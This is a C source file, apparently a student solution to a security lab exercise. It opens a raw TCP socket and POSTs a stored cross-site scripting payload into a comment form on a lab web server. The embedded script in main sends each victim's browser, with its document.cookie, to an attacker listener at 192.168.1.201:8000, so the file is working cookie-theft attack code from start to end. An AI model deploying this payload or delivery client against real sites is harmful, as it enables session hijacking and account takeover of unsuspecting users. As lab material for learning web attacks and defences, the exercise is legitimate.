// ex3_db_insert_stored.c
// runs on attacker CLIENT container
// goal: POST a comment into the vulnerable stored-xss page (so the victim later executes it)

#include <arpa/inet.h>
#include <ctype.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define WEB_SERVER_IP   "192.168.1.203"
#define WEB_SERVER_PORT 80
#define STORE_PATH "/task2stored.php" // where we submit the comment
#define FIELD_NAME "comment"          // form field name (POST body key)
#define IO_BUFSZ 4096

// same socket reuse options pattern as other exercises
static int apply_required_sockopts(int fd) {
  int opt = 1;

  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt)) < 0) {
    (void)close(fd);
    return -1;
  }
  opt = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &opt, (socklen_t)sizeof(opt)) < 0) {
    (void)close(fd);
    return -1;
  }
  return 0;
}

// open TCP connection to the web server
static int connect_tcp(const char *ip, uint16_t port) {
  int fd = socket(AF_INET, SOCK_STREAM, 0); // create TCP socket
  if (fd < 0) return -1;

  if (apply_required_sockopts(fd) < 0) return -1; // apply flags by staff

  struct sockaddr_in addr; // build destination address
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);

  if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
    (void)close(fd);
    return -1;
  }

  if (connect(fd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
    (void)close(fd);
    return -1;
  }

  return fd;
}

// write full buffer (no half sends)
static void write_all(int fd, const char *buf, size_t len) {
  size_t off = 0;

  // loop until all bytes are sent
  while (off < len) {
    ssize_t w = write(fd, buf + off, len - off);
    if (w <= 0) return;
    off += (size_t)w;
  }
}

// URL encoding helper: allowed chars stay, space -> '+', others -> %HH
static int is_unreserved(unsigned char c) {
  // characters allowed "as is" inside URL encoding
  return (isalnum((int)c) != 0) || c == '-' || c == '.' || c == '_' || c == '~';
}

// application/x-www-form-urlencoded style encoding
static size_t url_encode(const char *in, char *out, size_t out_sz) {
  static const char *hx = "0123456789ABCDEF";
  size_t w = 0;

  // encode every char of input into output
  for (size_t r = 0; in[r] != '\0'; r++) {
    unsigned char c = (unsigned char)in[r];

    if (is_unreserved(c)) {
      // keep safe chars
      if (w + 1 >= out_sz) break;
      out[w++] = (char)c;
    } else if (c == ' ') {
      // x-www-form-urlencoded uses '+' for spaces
      if (w + 1 >= out_sz) break;
      out[w++] = '+';
    } else {
      // everything else becomes %HH
      if (w + 3 >= out_sz) break;
      out[w++] = '%';
      out[w++] = hx[(c >> 4) & 0x0F];
      out[w++] = hx[c & 0x0F];
    }
  }

  if (w < out_sz) out[w] = '\0';
  return w;
}

// read and throw away the response (we don't need to print it)
static void drain_response(int fd) {
  // read until server closes (so we exit cleanly)
  char buf[IO_BUFSZ];
  while (read(fd, buf, sizeof(buf)) > 0) {
    // throw away the data (not needed)
  }
}

int main(void) {
  // the stored-xss payload:
  // it redirects victim to our listener with cookie in query param (?c=...)
  const char *comment_value = "<script>document.location='http://192.168.1.201:8000/?c='+document.cookie;</script>";

  // POST body must be x-www-form-urlencoded, so we encode the script
  char enc[8192];
  // Ensure the script is URL-encoded for the POST body
  (void)url_encode(comment_value, enc, sizeof(enc));

  // build POST body: comment=<encoded>
  char body[9000];
  int bn = snprintf(body, sizeof(body), "%s=%s", FIELD_NAME, enc);
  if (bn <= 0) return 0;

  // connect to web server and send POST
  int s = connect_tcp(WEB_SERVER_IP, (uint16_t)WEB_SERVER_PORT);
  if (s < 0) return 0;

  // build full HTTP request (headers + body)
  char req[12000];
  int rn = snprintf(req, sizeof(req),
                    "POST %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "Connection: close\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: %zu\r\n"
                    "\r\n"
                    "%s",
                    STORE_PATH, WEB_SERVER_IP, strlen(body), body
  );
  if (rn > 0) write_all(s, req, (size_t)rn);

  // read response until close so socket shuts down clean
  drain_response(s);
  (void)close(s);
  return 0;
}
